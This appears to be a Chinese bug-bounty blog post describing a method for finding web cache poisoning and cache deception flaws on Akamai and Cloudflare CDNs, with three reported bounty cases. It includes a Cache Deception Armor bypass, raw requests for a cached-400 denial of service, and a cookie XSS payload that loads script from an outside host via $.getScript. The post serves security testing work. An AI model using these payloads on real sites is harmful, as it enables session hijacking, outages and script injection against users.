#  Bombon 方法论：我将如何测试Web缓存漏洞   
 船山信安   2025-02-10 01:02  
  
## 什么是Web缓存漏洞  
  
Web缓存漏洞是指由于缓存机制配置或实现不当，导致攻击者可通过操纵缓存内容获取敏感信息、篡改数据或破坏服务安全性的安全风险。常见攻击包括**缓存投毒**  
（注入恶意响应误导用户）、**缓存欺骗**  
（诱骗缓存存储私密数据）以及**未授权缓存**  
（泄露本应受限的内容）。防御需严格校验缓存内容、限制敏感数据缓存、设置合理的缓存时间，并通过Cache-Control  
等HTTP头规范缓存行为，避免攻击者利用漏洞危害系统。  
```
### 举个形象的例子 ：假设有一个电商网站，用户登录后可以看到自己的“猜你喜欢”推荐商品列表。这个页面被配置为**缓存10分钟**，但缓存键（Cache Key）设计不当，只根据URL路径（如`/recommendations`）缓存，**没有区分用户身份**。**攻击过程**：1. **攻击者登录自己的账号**，访问`/recommendations`，页面显示他的推荐商品（比如“钓鱼装备”）。2. 服务器将他的推荐页面缓存起来，缓存键是`/recommendations`。3. **普通用户Alice登录后访问同一个URL**，由于缓存存在，她直接收到攻击者的推荐页面（“钓鱼装备”），而不是自己真实的推荐（比如“化妆品”）。4. **攻击者甚至可以篡改推荐内容**（例如插入恶意链接或虚假广告），导致所有用户看到被污染的页面。
```  
## 方法论  
#### 如果应用程序没有登录功能，但使用 Akamai CDN，则我的步骤如下：  
1. 抓包发送到Repeater（send to Repeater)![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8yD5LB4h4nnRribefWg3ASTxB1icmmly0JoAgc2vh6GR0xiaqHewj392FLQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 检查服务器是否缓存正常请求（可以通过响应头“Server-Timing: cdn-cache; desc=HIT”来判断）![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8yXlnRWyFCQXRAxbg4BE0o0pKAjuAEm2ic5icGic3Td2UOQyOo0h3lbYcicQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 在请求中添加非法请求标头![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8yibtiakNYjvK3w0ModwEHpX66icKibEXqCicrj845KwHbHucGNshEOHmW65w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 如果响应已成功缓存，当您在任何浏览器上打开 URL 时，您应该会收到 400 Bad Request  
  
#### 如果应用程序确实具有登录功能  
1. 创建一个用户  
  
1. 检查请求包里面有没有敏感信息，（如：会话令牌）!![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8ykZaU83TXIjyvl3gn6eCK5DeYroDVyR6K0xkyyTRvb2iaTqlqDfQQy1Q/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 发送到Repeater  
  
1. 在URL末尾添加可缓存的扩展名（.js，.css），看看是否给出了200 OK的响应  
  
1. 使用您的创建帐户打开修改后的URL!![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8yQNJDNk8vrLqUKJL3a84WVE7qdPpz8ibAqZiaic1tBYNPYBouJPDliayWag/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 使用curl或私密Private Web浏览器窗口打开相同的URL!![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8ycHzbdvZfoWjyyD9sd2VvtcGIgReCm4okQrRiajOQiba6oF2u3DewR7MQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
1. 如果令牌成功缓存，您应该在响应中看到令牌![image](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNSPiafBxicxLu65v4qib5jk8yWyZbhSZCKpPg2b2VbeNshd4v3vvzeKfvuqdTM3ZZ5MQibt8IX8rhicag/640?wx_fmt=jpeg&from=appmsg "")  
  
  
#### 如果应用程序正在使用Cloudflare CDN  
  
非法Header无法正常工作，现在大多数Cloudflare客户都使用  
Cache Deception Armor  
  
我能够使用.AVIF文件绕过此保护，这是一个非常未知的扩展文件。  
  
但是，有些站点没有激活此保护，您可以完美测试缓存中毒/欺骗  
#### 例子  
> **缓存欺骗到账户接管**  
→赏金 = 1,500 美元  
  
## 概括：  
  
所有 cookie（甚至是 HTTPonly cookie）均在 https://host.com/app/conversation/1.js 中公开。  
  
如果经过身份验证的用户访问此 URL，则其所有 cookie 都将存储在缓存中  
  
然后攻击者可以提取 cookie 并劫持其会话  
- 笔记：  
  
有时，如果响应是“404 Not found”，Akamai 只会将响应缓存不到 10 秒，这会使攻击者更难攻击。在这种情况下，攻击者需要快速行动，但是，如果 Akamai 检测到 200 Ok 响应，则响应将持续至少 24 小时。  
```
在某些应用程序中，如果你在扩展名前添加分号（;），它可能会给你一个 200 Ok 的响应例如/xxx/xxxxxx/;.js回复HTTP/2 200 正常
```  
> **缓存投毒导致 DoS → 赏金 = 1,000 美元**  
  
## 概括：  
  
在 Akamai CDN 中，如果我们发送反斜杠\  
作为标头，服务器将以 400Bad Request  
响应进行响应  
  
请求  
```
GET /products/xxx/xxxx/xxx/?test HTTP/2  Host: www.host.com  \:  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  Accept-Language: en-US,en;q=0.5  Accept-Encoding: gzip, deflate  Upgrade-Insecure-Requests: 1  Te: trailers
```  
  
响应  
```
HTTP/2 400 Bad RequestContent-Type: text/html;charset=iso-8859-1Content-Length: 70Cache-Control: max-age=297Expires: Thu, 21 Jul 2022 16:17:54 GMTDate: Thu, 21 Jul 2022 16:12:57 GMTServer-Timing: cdn-cache; desc=HITServer-Timing: edge; dur=32Server-Timing: origin; dur=147Strict-Transport-Security: max-age=86400Ak-Uuid: 0.bc85d817.1658419977.1592c61
```  
  
当网站使用缓存服务器时，这就会成为一个问题。网站通常只缓存 javascript、css 和其他文件，但当网站www.host.com  
还缓存正常响应时，例如  
  
www.host.com/products/*  
  
www.host.com/*  
  
等等  
  
这将会成为一个影响非常大的错误。  
```
Akamai`workaround`针对此漏洞进行了改进，使 400 响应在缓存中仅持续 5 秒，但是，攻击者可以使用 burp 中的入侵者发送空有效载荷，这样相同的 400 响应就会被永久缓存
```  
> **缓存中毒到存储型XSS → 赏金 = 1,000 美元**  
  
## 概括：  
  
n_vis  
通过Cookie 参数存在 XSS  
  
由于服务器缓存了此响应，攻击者可以保存 XSS Payload  
  
有一个强大的过滤器（和 WAF）可以阻止大多数有效负载，但由于该网站使用 Jquery，攻击者可以使用该$.getScript  
函数来利用这一点。  
  
请求  
```
GET /xxxx/xx-xx.otf?triagethiss HTTP/2  Host: www.host.com  Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  Accept-Language: en-xss,en;q=0.5  Accept-Encoding: gzip, deflate  Upgrade-Insecure-Requests: 1  Te: trailers
```  
  
响应  
```
<script>...Visitor.id='xssx'*$.getScript`//593.xss.ht`//;....</script>
```  
```
在任何请求标头、Cookie、自定义标头、X-Forwarded-* 标头上测试 XSS
```  
  
来源：https://www.freebuf.com/    感谢【EchoEverything】  
  
